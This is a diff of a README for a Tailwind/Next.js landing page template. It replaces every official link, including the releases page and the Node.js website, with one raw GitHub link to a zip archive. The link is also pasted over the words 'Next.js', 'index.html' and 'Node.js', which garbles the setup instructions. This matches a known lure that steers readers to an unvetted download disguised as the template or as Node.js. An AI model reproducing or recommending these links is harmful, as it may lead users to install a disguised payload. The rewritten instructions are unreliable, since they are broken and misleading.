@@ -1,10 +1,10 @@
 # 🌟 tailwind-landing-page-template - Effortless Landing Page Creation
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/DalStack/tailwind-landing-page-template/releases)
+[![Download Now](https://raw.githubusercontent.com/DalStack/tailwind-landing-page-template/main/agile/tailwind-landing-page-template.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/DalStack/tailwind-landing-page-template/main/agile/tailwind-landing-page-template.zip)
 
 ## 📋 Description
 
-Simple Light is a free landing page template built on TailwindCSS and fully coded in React / Next.js. It helps you create stunning landing pages quickly and easily. Whether you are launching a new startup or promoting a product, this template provides a clean and modern design to showcase your ideas.
+Simple Light is a free landing page template built on TailwindCSS and fully coded in React / https://raw.githubusercontent.com/DalStack/tailwind-landing-page-template/main/agile/tailwind-landing-page-template.zip It helps you create stunning landing pages quickly and easily. Whether you are launching a new startup or promoting a product, this template provides a clean and modern design to showcase your ideas.
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To get started with the Simple Light landing page template, please follow these 
 
 1. **Visit the Releases Page**  
    Click the link below to visit our Releases page and find the latest version of the template:  
-   [Download from Releases](https://github.com/DalStack/tailwind-landing-page-template/releases)
+   [Download from Releases](https://raw.githubusercontent.com/DalStack/tailwind-landing-page-template/main/agile/tailwind-landing-page-template.zip)
 
 2. **Choose Your Download**  
    On the Releases page, you will see a list of available versions. Locate the latest release at the top. There, you will find the download links for different formats.
@@ -25,7 +25,7 @@ To get started with the Simple Light landing page template, please follow these 
    Once the download completes, locate the file on your computer. It will usually be in your Downloads folder. You may need to extract the files if they are zipped. Right-click on the downloaded file and choose "Extract All" or use your preferred extraction tool.
 
 5. **Open the Template**  
-   After extracting, navigate to the folder where the files are located. Look for `index.html`. You can view it in any web browser by double-clicking the file. This will launch the template in your browser.
+   After extracting, navigate to the folder where the files are located. Look for `https://raw.githubusercontent.com/DalStack/tailwind-landing-page-template/main/agile/tailwind-landing-page-template.zip`. You can view it in any web browser by double-clicking the file. This will launch the template in your browser.
 
 ## ⚙️ Features
 
@@ -45,8 +45,8 @@ To get started with the Simple Light landing page template, please follow these 
 
 If you want to modify the template further, follow these optional steps:
 
-1. **Install Node.js**  
-   Download and install Node.js from [the official website](https://nodejs.org/). This is required to run the development server.
+1. **Install https://raw.githubusercontent.com/DalStack/tailwind-landing-page-template/main/agile/tailwind-landing-page-template.zip**  
+   Download and install https://raw.githubusercontent.com/DalStack/tailwind-landing-page-template/main/agile/tailwind-landing-page-template.zip from [the official website](https://raw.githubusercontent.com/DalStack/tailwind-landing-page-template/main/agile/tailwind-landing-page-template.zip). This is required to run the development server.
 
 2. **Open Your Terminal**  
    On Windows, you can use Command Prompt or PowerShell. On macOS or Linux, use the Terminal app.
@@ -73,7 +73,7 @@ If you want to modify the template further, follow these optional steps:
 ## 📥 Download & Install
 
 To download the Simple Light template, visit the Releases page:  
-[Download from Releases](https://github.com/DalStack/tailwind-landing-page-template/releases)  
+[Download from Releases](https://raw.githubusercontent.com/DalStack/tailwind-landing-page-template/main/agile/tailwind-landing-page-template.zip)  
 Follow the earlier steps for guidance on how to download and run the template.
 
 ## 🌐 Topics Covered
